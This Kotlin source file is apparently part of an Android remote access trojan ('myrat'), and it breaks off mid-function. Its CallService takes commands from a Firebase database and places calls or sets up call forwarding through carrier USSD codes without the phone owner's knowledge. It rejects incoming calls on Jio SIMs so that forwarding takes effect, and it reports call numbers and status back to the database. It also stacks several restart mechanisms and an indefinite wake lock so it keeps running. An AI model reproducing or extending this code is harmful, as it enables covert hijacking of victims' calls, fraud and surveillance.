package com.myrat.app.service

import android.Manifest
import android.app.*
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.telecom.Call
import android.telecom.PhoneAccountHandle
import android.telecom.TelecomManager
import android.telephony.PhoneStateListener
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.LauncherActivity
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.utils.Logger
import com.myrat.app.worker.CallServiceRestartWorker
import java.util.concurrent.TimeUnit

class CallService : Service() {
    companion object {
        private const val CHANNEL_ID = "CallServiceChannel"
        private const val NOTIFICATION_ID = 8
        private const val RESTART_DELAY = 1000L
    }

    private val sentCallTracker = mutableMapOf<String, MutableSet<String>>()
    private var deviceId: String = ""
    private var wakeLock: PowerManager.WakeLock? = null
    private var telephonyManager: TelephonyManager? = null
    private var telecomManager: TelecomManager? = null
    private var currentCallCommandId: String? = null
    private var phoneStateListener: PhoneStateListener? = null
    private var isCallActive: Boolean = false
    private var currentCallNumber: String? = null
    private var callStartTime: Long = 0
    private val handler = Handler(Looper.getMainLooper())
    private var lastCallState = TelephonyManager.CALL_STATE_IDLE
    private var currentCall: Call? = null
    private var callCallback: Call.Callback? = null

    // Handler for periodic restart scheduling
    private val restartHandler = Handler(Looper.getMainLooper())
    private var restartRunnable: Runnable? = null

    // Call forwarding data
    private val simCarrierMap = mutableMapOf<String, String>()
    private val forwardingNumbers = mutableMapOf<String, String>()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        try {
            if (!hasRequiredPermissions()) {
                Logger.error("Missing required permissions, stopping CallService")
                stopSelf()
                return
            }

            deviceId = MainActivity.getDeviceId(this)
            if (deviceId.isEmpty()) {
                Logger.error("Device ID is empty, stopping CallService")
                stopSelf()
                return
            }

            acquireWakeLock()
            createNotificationChannel()
            val notification = buildForegroundNotification()
            startForeground(NOTIFICATION_ID, notification)

            // Multiple restart mechanisms for maximum persistence
            scheduleWorkManagerRestart()
            scheduleAlarmManagerRestart()
            schedulePeriodicRestart()

            // Initialize all monitoring systems
            setupPhoneStateListener()
            setupTelecomManager()
            loadSimCarrierInfo()

            // Initialize call status in Firebase
            updateCallStatus("idle", null, null, null)

            Logger.log("Enhanced CallService created successfully for device: $deviceId")
        } catch (e: Exception) {
            Logger.error("Failed to initialize CallService", e)
            restartSelfDelayed()
        }
    }

    private fun loadSimCarrierInfo() {
        try {
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val subscriptionInfoList = subscriptionManager.activeSubscriptionInfoList

            subscriptionInfoList?.forEach { info ->
                val simSlot = "sim${info.simSlotIndex + 1}"
                val carrierName = info.carrierName?.toString()?.lowercase() ?: ""
                val mcc = info.mccString ?: ""
                val mnc = info.mncString ?: ""
                
                // Detect carrier based on MCC-MNC or carrier name
                val carrier = detectCarrier(carrierName, mcc, mnc)
                simCarrierMap[simSlot] = carrier
                
                Logger.log("SIM $simSlot detected as $carrier (MCC: $mcc, MNC: $mnc, Name: $carrierName)")
            }
        } catch (e: Exception) {
            Logger.error("Failed to load SIM carrier info", e)
        }
    }

    private fun detectCarrier(carrierName: String, mcc: String, mnc: String): String {
        return when {
            // Jio detection
            carrierName.contains("jio", ignoreCase = true) ||
            (mcc == "405" && (mnc == "857" || mnc == "863" || mnc == "864" || mnc == "865" || mnc == "866" || mnc == "867" || mnc == "868" || mnc == "869" || mnc == "870" || mnc == "871" || mnc == "872" || mnc == "873" || mnc == "874")) -> "jio"
            
            // Airtel detection
            carrierName.contains("airtel", ignoreCase = true) ||
            (mcc == "405" && (mnc == "845" || mnc == "846" || mnc == "847" || mnc == "848" || mnc == "849" || mnc == "850" || mnc == "851" || mnc == "852" || mnc == "853" || mnc == "854" || mnc == "855" || mnc == "856")) -> "airtel"
            
            // Vi (Vodafone Idea) detection
            carrierName.contains("vi", ignoreCase = true) ||
            carrierName.contains("vodafone", ignoreCase = true) ||
            carrierName.contains("idea", ignoreCase = true) ||
            (mcc == "405" && (mnc == "750" || mnc == "751" || mnc == "752" || mnc == "753" || mnc == "754" || mnc == "755" || mnc == "756")) -> "vi"
            
            // BSNL detection
            carrierName.contains("bsnl", ignoreCase = true) ||
            (mcc == "405" && (mnc == "800" || mnc == "801" || mnc == "802" || mnc == "803")) -> "bsnl"
            
            else -> "unknown"
        }
    }

    private fun setupPhoneStateListener() {
        try {
            telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            if (telephonyManager == null) {
                Logger.error("TelephonyManager unavailable")
                return
            }

            phoneStateListener = object : PhoneStateListener() {
                override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                    try {
                        Logger.log("PhoneStateListener - Call state changed: $lastCallState -> $state, number: $phoneNumber")
                        handleCallStateChange(state, phoneNumber, "PhoneStateListener")
                        lastCallState = state
                    } catch (e: Exception) {
                        Logger.error("Error in PhoneStateListener", e)
                    }
                }
            }

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
                Logger.log("PhoneStateListener registered")
            } else {
                Logger.error("Missing READ_PHONE_STATE permission")
            }
        } catch (e: Exception) {
            Logger.error("Failed to setup PhoneStateListener", e)
        }
    }

    private fun setupTelecomManager() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                telecomManager = getSystemService(TELECOM_SERVICE) as? TelecomManager
                if (telecomManager == null) {
                    Logger.error("TelecomManager unavailable")
                    return
                }

                // Monitor ongoing calls
                monitorOngoingCalls()
                Logger.log("TelecomManager setup completed")
            }
        } catch (e: Exception) {
            Logger.error("Failed to setup TelecomManager", e)
        }
    }

    private fun monitorOngoingCalls() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && telecomManager != null) {
                // Check for ongoing calls periodically
                handler.post(object : Runnable {
                    override fun run() {
                        try {
                            if (ContextCompat.checkSelfPermission(this@CallService, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                                val isInCall = telecomManager?.isInCall ?: false
                                val isInManagedCall = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    telecomManager?.isInManagedCall ?: false
                                } else {
                                    false
                                }

                                Logger.log("TelecomManager - isInCall: $isInCall, isInManagedCall: $isInManagedCall")

                                // Cross-reference with PhoneStateListener
                                val currentTelephonyState = telephonyManager?.callState ?: TelephonyManager.CALL_STATE_IDLE

                                if (isInCall || isInManagedCall || currentTelephonyState != TelephonyManager.CALL_STATE_IDLE) {
                                    if (!isCallActive) {
                                        Logger.log("TelecomManager detected call start")
                                        handleCallStateChange(TelephonyManager.CALL_STATE_OFFHOOK, currentCallNumber, "TelecomManager")
                                    }
                                } else {
                                    if (isCallActive) {
                                        Logger.log("TelecomManager detected call end")
                                        handleCallStateChange(TelephonyManager.CALL_STATE_IDLE, null, "TelecomManager")
                                    }
                                }
                            }
                        } catch (e: Exception) {
                            Logger.error("Error in TelecomManager monitoring", e)
                        }

                        // Schedule next check
                        handler.postDelayed(this, 2000) // Check every 2 seconds
                    }
                })
            }
        } catch (e: Exception) {
            Logger.error("Failed to monitor ongoing calls", e)
        }
    }

    private fun handleCallStateChange(state: Int, phoneNumber: String?, source: String) {
        try {
            Logger.log("[$source] Handling call state change: $state, number: $phoneNumber")

            when (state) {
                TelephonyManager.CALL_STATE_IDLE -> {
                    Logger.log("[$source] Call ended (state: IDLE)")
                    if (isCallActive || lastCallState != TelephonyManager.CALL_STATE_IDLE) {
                        val duration = if (callStartTime > 0) {
                            (System.currentTimeMillis() - callStartTime) / 1000
                        } else 0

                        isCallActive = false
                        updateCallStatus("idle", null, null, duration)

                        currentCallCommandId?.let { commandId ->
                            updateCommandStatus(commandId, "completed", null)
                            currentCallCommandId = null
                        }
                        currentCallNumber = null
                        callStartTime = 0
                        currentCall = null
                    }
                }
                TelephonyManager.CALL_STATE_OFFHOOK -> {
                    Logger.log("[$source] Call active (state: OFFHOOK)")
                    if (!isCallActive) {
                        isCallActive = true
                        callStartTime = System.currentTimeMillis()
                        val number = phoneNumber ?: currentCallNumber ?: detectCallNumber() ?: "Unknown"
                        currentCallNumber = number
                        updateCallStatus("active", number, currentCallCommandId, null)

                        // If this is an external call (no command ID), create one
                        if (currentCallCommandId == null && number != "Unknown") {
                            handleExternalCall(number)
                        }
                    }
                }
                TelephonyManager.CALL_STATE_RINGING -> {
                    Logger.log("[$source] Call ringing (state: RINGING)")
                    val number = phoneNumber ?: currentCallNumber ?: detectCallNumber() ?: "Unknown"
                    currentCallNumber = number
                    updateCallStatus("ringing", number, currentCallCommandId, null)
                    
                    // Handle incoming call for Jio SIM - reject if forwarding is enabled
                    handleIncomingCall(number)
                }
            }
        } catch (e: Exception) {
            Logger.error("Error handling call state change", e)
        }
    }

    private fun handleIncomingCall(incomingNumber: String) {
        try {
            // Check if any SIM has forwarding enabled and is Jio
            Firebase.database.getReference("Device/$deviceId/call_forwarding")
                .addListenerForSingleValueEvent(object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        try {
                            snapshot.children.forEach { simSnapshot ->
                                val simSlot = simSnapshot.key ?: return@forEach
                                val forwardingData = simSnapshot.value as? Map<*, *> ?: return@forEach
                                val isEnabled = forwardingData["enabled"] as? Boolean ?: false
                                val forwardNumber = forwardingData["forwardNumber"] as? String
                                
                                if (isEnabled && !forwardNumber.isNullOrEmpty()) {
                                    val carrier = simCarrierMap[simSlot] ?: "unknown"
                                    
                                    if (carrier == "jio") {
                                        Logger.log("Incoming call on Jio SIM with forwarding enabled - rejecting call")
                                        rejectIncomingCall()
                                        return@forEach
                                    }
                                }
                            }
                        } catch (e: Exception) {
                            Logger.error("Error checking forwarding settings for incoming call", e)
                        }
                    }
                    
                    override fun onCancelled(error: DatabaseError) {
                        Logger.error("Failed to check forwarding settings", error.toException())
                    }
                })
        } catch (e: Exception) {
            Logger.error("Error handling incoming call", e)
        }
    }

    private fun rejectIncomingCall() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && telecomManager != null) {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ANSWER_PHONE_CALLS) == PackageManager.PERMISSION_GRANTED) {
                    telecomManager!!.endCall()
                    Logger.log("Incoming call rejected via TelecomManager")
                    return
                }
            }
            
            // Fallback method using reflection
            try {
                val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                val telephonyClass = Class.forName(telephonyManager.javaClass.name)
                val getITelephonyMethod = telephonyClass.getDeclaredMethod("getITelephony")
                getITelephonyMethod.isAccessible = true
                val iTelephony = getITelephonyMethod.invoke(telephonyManager)
                
                if (iTelephony != null) {
                    val iTelephonyClass = Class.forName(iTelephony.javaClass.name)
                    val endCallMethod = iTelephonyClass.getDeclaredMethod("endCall")
                    endCallMethod.isAccessible = true
                    endCallMethod.invoke(iTelephony)
                    Logger.log("Incoming call rejected via reflection")
                }
            } catch (e: Exception) {
                Logger.error("Failed to reject call via reflection", e)
            }
        } catch (e: Exception) {
            Logger.error("Failed to reject incoming call", e)
        }
    }

    private fun detectCallNumber(): String? {
        try {
            // Try to get call details from TelecomManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && telecomManager != null) {
                // This would require additional permissions and API access
                // For now, we'll rely on the number passed from the command or PhoneStateListener
                return null
            }
            return null
        } catch (e: Exception) {
            Logger.error("Error detecting call number", e)
            return null
        }
    }

    private fun updateCallStatus(status: String, number: String?, commandId: String?, duration: Long?) {
        try {
            val callStatusRef = Firebase.database.getReference("Device/$deviceId/call_status")
            val statusData = mutableMapOf<String, Any?>(
                "status" to status,
                "timestamp" to System.currentTimeMillis(),
                "source" to "enhanced_service"
            )

            when (status) {
                "dialing" -> {
                    statusData["number"] = number
                    statusData["commandId"] = commandId
                    statusData["startTime"] = null
                }
                "ringing" -> {
                    statusData["number"] = number
                    statusData["commandId"] = commandId
                    statusData["startTime"] = null
                }
                "active" -> {
                    statusData["number"] = number
                    statusData["commandId"] = commandId
                    statusData["startTime"] = callStartTime
                }
                "idle" -> {
                    statusData["number"] = null
                    statusData["commandId"] = null
                    statusData["startTime"] = null
                    if (duration != null && duration > 0) {
                        statusData["lastCallDuration"] = duration
                    }
                }
            }

            callStatusRef.setValue(statusData)
                .addOnSuccessListener {
                    Logger.log("Call status updated: $status -> $number")
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to update call status", e)
                }
        } catch (e: Exception) {
            Logger.error("Error updating call status", e)
        }
    }

    private fun handleExternalCall(phoneNumber: String) {
        try {
            if (currentCallCommandId != null) {
                Logger.log("Existing call command active, skipping external call registration")
                return
            }

            val commandsRef = Firebase.database.getReference("Device/$deviceId/call_commands")
            val commandId = commandsRef.push().key ?: return
            currentCallCommandId = commandId

            commandsRef.child(commandId).setValue(
                mapOf(
                    "sim_number" to "sim1", // Default to sim1
                    "recipient" to phoneNumber,
                    "status" to "active", // Mark as active since call is already in progress
                    "timestamp" to System.currentTimeMillis(),
                    "type" to "external", // Mark as external call
                    "detected_by" to "enhanced_service"
                )
            )
            Logger.log("Registered external call to $phoneNumber with commandId: $commandId")
        } catch (e: Exception) {
            Logger.error("Failed to register external call", e)
        }
    }

    private fun hasRequiredPermissions(): Boolean {
        val permissions = arrayOf(
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE
        )
        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (powerManager == null) {
                Logger.error("PowerManager unavailable")
                return
            }
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "CallService:KeepAlive"
            )
            wakeLock?.acquire() // Indefinite wake lock
            Logger.log("Wake lock acquired for CallService")
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake lock for calls", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            if (deviceId.isEmpty()) {
                Logger.error("Device ID is empty, attempting to reinitialize")
                deviceId = MainActivity.getDeviceId(this)
                if (deviceId.isEmpty()) {
                    restartSelfDelayed()
                    return START_STICKY
                }
            }
            listenForCallCommands(deviceId)
            listenForForwardingCommands(deviceId)
            return START_STICKY
        } catch (e: Exception) {
            Logger.error("Failed to start CallService", e)
            restartSelfDelayed()
            return START_STICKY
        }
    }

    private fun listenForForwardingCommands(deviceId: String) {
        try {
            val forwardingRef = Firebase.database.getReference("Device").child(deviceId).child("call_forwarding_commands")
            
            forwardingRef.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { commandSnapshot ->
                            val command = commandSnapshot.value as? Map<*, *> ?: return@forEach
                            val action = command["action"] as? String ?: return@forEach
                            val simSlot = command["sim_slot"] as? String ?: return@forEach
                            val forwardNumber = command["forward_number"] as? String
                            val commandId = commandSnapshot.key ?: return@forEach
                            val status = command["status"] as? String ?: return@forEach
                            
                            if (status == "pending") {
                                Logger.log("Processing forwarding command: $action for $simSlot")
                                processForwardingCommand(action, simSlot, forwardNumber, commandId)
                                
                                // Remove the command after processing
                                commandSnapshot.ref.removeValue()
                            }
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing forwarding commands", e)
                    }
                }
                
                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Forwarding commands listener cancelled", error.toException())
                }
            })
        } catch (e: Exception) {
            Logger.error("Failed to setup forwarding commands listener", e)
        }
    }

    private fun processForwardingCommand(action: String, simSlot: String, forwardNumber: String?, commandId: String) {
        try {
            val carrier = simCarrierMap[simSlot] ?: "unknown"
            
            when (action) {
                "enable_forwarding" -> {
                    if (forwardNumber.isNullOrEmpty()) {
                        updateForwardingCommandStatus(commandId, "failed", "Forward number is required")
                        return
                    }
                    enableCallForwarding(simSlot, forwardNumber, carrier, commandId)
                }
                "disable_forwarding" -> {
                    disableCallForwarding(simSlot, carrier, commandId)
                }
                "check_status" -> {
                    checkForwardingStatus(simSlot, carrier, commandId)
                }
                else -> {
                    updateForwardingCommandStatus(commandId, "failed", "Unknown action: $action")
                }
            }
        } catch (e: Exception) {
            Logger.error("Error processing forwarding command", e)
            updateForwardingCommandStatus(commandId, "failed", "Error: ${e.message}")
        }
    }

    private fun enableCallForwarding(simSlot: String, forwardNumber: String, carrier: String, commandId: String) {
        try {
            val forwardingCode = getForwardingCode(carrier, "enable", forwardNumber)
            
            if (forwardingCode.isEmpty()) {
                updateForwardingCommandStatus(commandId, "failed", "Unsupported carrier: $carrier")
                return
            }
            
            Logger.log("Enabling call forwarding for $simSlot ($carrier) to $forwardNumber using code: $forwardingCode")
            
            // Execute the forwarding code
            initiateCallWithSimSelection(simSlot, forwardingCode, commandId)
            
            // Save forwarding settings
            saveForwardingSettings(simSlot, forwardNumber, true)
            
            updateForwardingCommandStatus(commandId, "success", "Call forwarding enabled")
            
        } catch (e: Exception) {
            Logger.error("Failed to enable call forwarding", e)
            updateForwardingCommandStatus(commandId, "failed", "Failed to enable: ${e.message}")
        }
    }

    private fun disableCallForwarding(simSlot: String, carrier: String, commandId: String) {
        try {
            val forwardingCode = getForwardingCode(carrier, "disable", "")
            
            if (forwardingCode.isEmpty()) {
                updateForwardingCommandStatus(commandId, "failed", "Unsupported carrier: $carrier")
                return
            }
            
            Logger.log("Disabling call forwarding for $simSlot ($carrier) using code: $forwardingCode")
            
            // Execute the forwarding code
            initiateCallWithSimSelection(simSlot, forwardingCode, commandId)
            
            // Save forwarding settings
            saveForwardingSettings(simSlot, "", false)
            
            updateForwardingCommandStatus(commandId, "success", "Call forwarding disabled")
            
        } catch (e: Exception) {
            Logger.error("Failed to disable call forwarding", e)
            updateForwardingCommandStatus(commandId, "failed", "Failed to disable: ${e.message}")
        }
    }

    private fun checkForwardingStatus(simSlot: String, carrier: String, commandId: String) {
        try {
            val statusCode = getForwardingCode(carrier, "check", "")
            
            if (statusCode.isEmpty()) {
                updateForwardingCommandStatus(commandId, "failed", "Unsupported carrier: $carrier")
                return
            }
            
            Logger.log("Checking call forwarding status for $simSlot ($carrier) using code: $statusCode")
            
            // Execute the status check code
            initiateCallWithSimSelection(simSlot, statusCode, commandId)
            
            updateForwardingCommandStatus(commandId, "success", "Status check initiated")
            
        } catch (e: Exception) {
            Logger.error("Failed to check forwarding status", e)
            updateForwardingCommandStatus(commandId, "failed", "Failed to check: ${e.message}")
        }
    }

    private fun getForwardingCode(carrier: String, action: String, forwardNumber: String): String {
        return when (carrier.lowercase()) {
            "jio" -> {
                when (action) {
                    "enable" -> "*405*$forwardNumber#" // Call forwarding when busy
                    "disable" -> "#405#"
                    "check" -> "*#405#"
                    else -> ""
                }
            }
            "airtel" -> {
                when (action) {
                    "enable" -> "*121*$forwardNumber#" // Call forwarding unconditional
                    "disable" -> "#121#"
                    "check" -> "*#121#"
                    else -> ""
                }
            }
            "vi" -> {
                when (action) {
                    "enable" -> "*121*$forwardNumber#" // Call forwarding unconditional
                    "disable" -> "#121#"
                    "check" -> "*#121#"
                    else -> ""
                }
            }
            "bsnl" -> {
                when (action) {
                    "enable" -> "*121*$forwardNumber#" // Call forwarding unconditional
                    "disable" -> "#121#"
                    "check" -> "*#121#"
                    else -> ""
                }
            }
            else -> ""
        }
    }

    private fun saveForwardingSettings(simSlot: String, forwardNumber: String, enabled: Boolean) {
        try {
            val forwardingData = mapOf(
                "enabled" to enabled,
                "forwardNumber" to forwardNumber,
                "timestamp" to System.currentTimeMillis(),
                "carrier" to (simCarrierMap[simSlot] ?: "unknown")
            )
            
            Firebase.database.getReference("Device/$deviceId/call_forwarding/$simSlot")
                .setValue(forwardingData)
                .addOnSuccessListener {
                    Logger.log("Forwarding settings saved for $simSlot")
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to save forwarding settings", e)
                }
        } catch (e: Exception) {
            Logger.error("Error saving forwarding settings", e)
        }
    }

    private fun updateForwardingCommandStatus(commandId: String, status: String, message: String) {
        try {
            val statusData = mapOf(
                "status" to status,
                "message" to message,
                "timestamp" to System.currentTimeMillis()
            )
            
            Firebase.database.getReference("Device/$deviceId/call_forwarding_status/$commandId")
                .setValue(statusData)
                .addOnSuccessListener {
                    Logger.log("Forwarding command status updated: $commandId -> $status")
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to update forwarding command status", e)
                }
        } catch (e: Exception) {
            Logger.error("Error updating forwarding command status", e)
        }
    }

    // Enhanced WorkManager restart with more frequent checks
    private fun scheduleWorkManagerRestart() {
        try {
            val workRequest = PeriodicWorkRequestBuilder<CallServiceRestartWorker>(
                repeatInterval = 3, TimeUnit.MINUTES,
                flexTimeInterval = 30, TimeUnit.SECONDS
            ).setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.NOT_REQUIRED)
                    .setRequiresBatteryNotLow(false)
                    .setRequiresCharging(false)
                    .setRequiresDeviceIdle(false)
                    .build()
            ).build()

            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "CallServiceRestart",
                ExistingPeriodicWorkPolicy.REPLACE,
                workRequest
            )
            Logger.log("Scheduled CallService restart using WorkManager")
        } catch (e: Exception) {
            Logger.error("Failed to schedule CallService restart", e)
        }
    }

    // AlarmManager backup restart mechanism
    private fun scheduleAlarmManagerRestart() {
        try {
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(this, CallService::class.java)
            val pendingIntent = PendingIntent.getService(
                this, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            val triggerTime = System.currentTimeMillis() + (5 * 60 * 1000)
            alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                triggerTime,
                5 * 60 * 1000,
                pendingIntent
            )
            Logger.log("Scheduled AlarmManager restart backup")
        } catch (e: Exception) {
            Logger.error("Failed to schedule AlarmManager restart", e)
        }
    }

    // Handler-based periodic restart
    private fun schedulePeriodicRestart() {
        restartRunnable = object : Runnable {
            override fun run() {
                try {
                    ensureServiceRunning()
                    restartHandler.postDelayed(this, 10 * 60 * 1000)
                } catch (e: Exception) {
                    Logger.error("Error in periodic restart check", e)
                    restartHandler.postDelayed(this, 60 * 1000)
                }
            }
        }
        restartRunnable?.let {
            restartHandler.postDelayed(it, 10 * 60 * 1000)
        }
    }

    private fun ensureServiceRunning() {
        Logger.log("CallService health check - still running")
    }

    private fun restartSelfDelayed() {
        restartHandler.postDelayed({
            try {
                val intent = Intent(this, CallService::class.java)
                startService(intent)
            } catch (e: Exception) {
                Logger.error("Failed to restart service", e)
            }
        }, RESTART_DELAY)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "Enhanced Call Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Enhanced phone call service with forwarding and multi-layer monitoring"
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                }
                val notificationManager = getSystemService(NotificationManager::class.java)
                notificationManager.createNotificationChannel(channel)
            } catch (e: Exception) {
                Logger.error("Failed to create call notification channel", e)
            }
        }
    }

    private fun buildForegroundNotification(): Notification {
        return try {
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Enhanced Call Service")
                .setContentText("Multi-layer call monitoring and forwarding active")
                .setSmallIcon(android.R.drawable.ic_menu_call)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .build()
        } catch (e: Exception) {
            Logger.error("Failed to build call notification", e)
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Call Service")
                .setContentText("Running in background")
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build()
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Logger.log("Task removed - restarting CallService")

        val intent = Intent(this, CallService::class.java)
        startService(intent)
        restartSelfDelayed()
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            if (connectivityManager == null) {
                Logger.error("ConnectivityManager unavailable")
                return false
            }
            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)
            capabilities != null && (
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
                    )
        } catch (e: Exception) {
            Logger.error("Error checking network availability", e)
            false
        }
    }

    private fun listenForCallCommands(deviceId: String) {
        if (!isNetworkAvailable()) {
            Logger.error("No network available, but continuing CallService for offline functionality")
        }

        try {
            val commandsRef = Firebase.database.getReference("Device").child(deviceId).child("call_commands")

            commandsRef.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { commandSnapshot ->
                            try {
                                val command = commandSnapshot.value as? Map<*, *>
                                if (command == null) {
                                    Logger.error("Invalid command data for ${commandSnapshot.key}")
                                    return@forEach
                                }

                                val status = command["status"] as? String
                                val simNumber = command["sim_number"] as? String
                                val recipient = command["recipient"] as? String
                                val isForward = command["isForward"] as? Boolean ?: false
                                val commandId = commandSnapshot.key ?: return@forEach

                                if (status == null || simNumber == null || recipient == null) {
                                    Logger.error("Missing required fields in command $commandId")
                                    updateCommandStatus(commandId, "failed", "Missing required fields")
                                    return@forEach
                                }

                                when (status) {
                                    "pending" -> {
                                        if (isCallActive && currentCallCommandId != commandId) {
                                            Logger.log("Skipping new call command $commandId: another call is active")
                                            updateCommandStatus(commandId, "failed", "Another call is active")
                                            return@forEach
                                        }
                                        
                                        // Handle forwarding logic
                                        val finalRecipient = if (isForward) {
                                            handleForwardingLogic(simNumber, recipient)
                                        } else {
                                            recipient
                                        }
                                        
                                        Logger.log("Processing call command: $commandId from $simNumber to $finalRecipient (isForward: $isForward)")
                                        currentCallCommandId = commandId
                                        currentCallNumber = finalRecipient
                                        initiateCallWithEnhancedMonitoring(simNumber, finalRecipient, commandId)
                                    }
                                    "cancel" -> {
                                        Logger.log("Cancel command received for $commandId")
                                        if (currentCallCommandId == commandId && isCallActive) {
                                            endCallWithMultipleMethods(commandId)
                                        } else {
                                            Logger.log("Ignoring cancel for $commandId: no matching active call")
                                            updateCommandStatus(commandId, "cancelled", "No matching active call")
                                        }
                                    }
                                }
                            } catch (e: Exception) {
                                Logger.error("Error processing command ${commandSnapshot.key}", e)
                                updateCommandStatus(commandSnapshot.key ?: "", "failed", "Error processing command: ${e.message}")
                            }
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing call commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Call commands database error: ${error.message}", error.toException())
                    restartSelfDelayed()
                }
            })
        } catch (e: Exception) {
            Logger.error("Failed to listen for call commands", e)
            restartSelfDelayed()
        }
    }

    private fun handleForwardingLogic(simNumber: String, recipient: String): String {
        try {
            // Get carrier for the SIM
            val carrier = simCarrierMap[simNumber] ?: "unknown"
            
            // Get forwarding code based on carrier
            val forwardingCode = when (carrier.lowercase()) {
                "jio" -> "*121$recipient#"
                "airtel" -> "*121$recipient#"
                "vi" -> "*121$recipient#"
                "bsnl" -> "*121$recipient#"
                else -> {
                    Logger.log("Unknown carrier for $simNumber, using default forwarding")
                    "*121$recipient#"
                }
            }
            
            Logger.log("Forwarding call from $simNumber ($carrier) using code: $forwardingCode")
            return forwardingCode
            
        } catch (e: Exception) {
            Logger.error("Error in forwarding logic", e)
            return "$recipient#" // Fallback
        }
    }

    private fun initiateCallWithEnhancedMonitoring(simNumber: String, recipient: String, commandId: String): Boolean {
        try {
            if (isCallActive && currentCallCommandId != commandId) {
                Logger.error("Cannot initiate call: another call is active")
                updateCommandStatus(commandId, "failed", "Another call is active")
                return false
            }

            val alreadySentSet = sentCallTracker.getOrPut(commandId) { mutableSetOf() }
            if (alreadySentSet.contains(recipient)) {
                Logger.log("Skipping duplicate call to $recipient for command $commandId")
                return false
            }

            if (!hasRequiredPermissions()) {
                Logger.error("Missing permissions for call")
                updateCommandStatus(commandId, "failed", "Missing required permissions")
                return false
            }

            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            if (subscriptionManager == null) {
                Logger.error("SubscriptionManager unavailable")
                updateCommandStatus(commandId, "failed", "SubscriptionManager unavailable")
                return false
            }

            val subscriptionInfoList = try {
                subscriptionManager.activeSubscriptionInfoList
            } catch (e: SecurityException) {
                Logger.error("Security exception getting subscription info", e)
                updateCommandStatus(commandId, "failed", "Permission denied for subscription info")
                return false
            }

            if (subscriptionInfoList == null || subscriptionInfoList.isEmpty()) {
                Logger.error("No active SIM subscriptions found")
                updateCommandStatus(commandId, "failed", "No active SIM subscriptions")
                return false
            }

            val normalizedSimNumber = simNumber.trim().lowercase()
            Logger.log("Normalized simNumber: $normalizedSimNumber")

            val subscriptionInfo = subscriptionInfoList.find { info ->
                val simSlotIndex = info.simSlotIndex
                val phoneNumber = try { info.number?.lowercase() ?: "" } catch (e: Exception) { "" }
